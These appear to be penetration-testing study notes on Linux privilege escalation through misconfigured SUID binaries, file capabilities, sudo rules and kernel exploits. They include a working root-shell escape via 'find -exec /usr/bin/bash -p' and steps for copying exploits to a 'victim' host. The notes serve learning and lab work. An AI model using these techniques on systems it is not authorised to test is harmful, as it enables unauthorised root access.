

### Abusing Setuid and Capabilities

##### SUID

`ps u -C <binary running>` - we can get the PID of a running process for inspection purposes to show how uids work

`grep Uid /proc/<PID>/status` - inspect the real id, UID and eUID (0 = root)

`ls -asl` list the permissions - look for the S/s

`chmod u+s <filename>` - set the suid bit on the file

`find / -perm -u=s -type f 2>/dev/null` - search for all files in the system with suid or guid set with the goal of executing a command or script as root.

`If we find a file that has the suid bit set, and for some reason it is misconfigured we could use this binary to execute privileges`

for example if `find` was misconfigured we could:

`find /home/user/Desktop -exec "/usr/bin/bash" -p \;` - which will run find and give us an elevated shell because the suid bit is set, effectively making us root through the eUID.

##### Capabilities

Capabilities are extra attributes that can be applied to processes, binaries and services to assign specific privileges. These privileges are usually used for admin operations.

If these binaries are misconfigured they could also lead to privesc to root.

`/usr/sbin/getcap -r / 2>/dev/null` - enumerate the system for binaries with capabilities

example output:

```
/usr/bin/perl = cap_setuid+ep  -> has setuid capabilities and +ep set (effective and permitted)
/usr/bin/perl5.28.1 = cap_setuid+ep  -> same here
```

`When we find a binary with capabilties like this we should check GTFObins for a way to exploit it`

### Abusing Sudo


Custom configuration to sudo is added to the /etc/sudoers file. We can use `sudo -l`  to list these.

Sudo essentially changes the eUID of the user executing the command.

If we find a sudo capability when inspecting the sudoers file we should research it on GTFObins for an easy escalation method - though this may not always work, don't die here.

`cat /var/log/syslog  | grep <binary we tried to exploit>` If we are denied in the process we can investigate the syslog file, we may notice that it was an auditing daemon that prevented us.

If we have root access at some point we may be able to view how this command was protected.


### Exploiting Kernel Vulnerabilities

First we need to run some enumeration to get relative information

`cat /etc/issue && cat /etc/os-release && uname -r && arch` - get system information

`searchsploit <information obtained>` - use grep as well to filter out some clutter if needed

grab a suitable exploit, inspect it, and execute if valid. `for exploits that need to be compiled if possible compile the code on the target so compilation and exploitation can run as smooth as possible`.

`scp <file_name> user@ip:` - transfer the file using scp to the victim 

`file <binary>` - double check compilation ELF info for correct arch, etc.

When it comes to Linux privesc check out the following site, its pretty good with various commands you can try out when you have to do local enum on a system https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ and if you come across a system when something isnt installed to compile exploits then you can also try compiling on kali and transferring across to target.